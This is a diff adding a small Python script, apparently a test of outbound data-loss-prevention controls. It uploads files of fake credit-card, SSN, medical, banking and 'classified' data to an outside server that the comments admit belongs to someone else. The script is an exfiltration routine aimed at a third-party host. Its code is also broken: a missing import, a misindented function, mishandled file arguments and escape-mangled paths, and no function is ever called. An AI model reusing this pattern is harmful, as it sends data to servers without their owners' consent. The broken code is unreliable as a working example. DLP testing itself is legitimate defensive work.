@@ -1,0 +1,54 @@
+#import socket
+#import subprocess
+#import sys
+#from datetime import datetime
+import os
+
+# Define the server that will receive the fake PII files. This is using a random server owned by someone else. Change the host to your own server if you have one.
+targetServerURL = "jigsaw.w3.org/css-validator/validator"
+
+
+
+# Scan Banner
+print ("Sending PII files to an external server to determine what what can be detected outbound:")
+print ("Target Server = ", targetServerURL)
+print ("")
+#List files that are sent here!
+print ("Files being sent:")
+print ("Credit Card Numbers and metadata")
+print ("Social Security Numbers with names")
+print ("Date of Birth with names")
+print ("Classified Data (For Official Use Only, Confidential, Secret, Top Secret")
+print ("Medical information with names")
+print ("Bank account information")
+
+
+#Need to set a variable that has the file location of all of my pii files
+filePath = os.path.dirname(os.path.abspath(__file__))
+
+
+#functions...
+def sendCCN():
+    ccn_num = filePath + "\ccn.csv"
+    response = requests.post(targetServerURL, files=ccn_num)
+
+def sendSSN():
+    ssn_num = filePath + "\ssn.csv"
+    response = requests.post(targetServerURL, files=ssn_num)
+
+def sendDOB():
+    dob = filePath + "\dob.csv"
+    response = requests.post(targetServerURL, files=dob)
+
+ def sendClassifed():
+    classified = filePath + "\classified.doc"
+    response = requests.post(targetServerURL, files=classified)
+
+def sendMedical():
+    medical = filePath + "\medical.doc"
+    response = requests.post(targetServerURL, files=medical)
+
+def sendBanking():
+    banking = filePath + "\banking.csv"
+    response = requests.post(targetServerURL, files=banking)
+#TODO: I am using CSV and WORD DOCs. This could be problematic if people don't have office installed
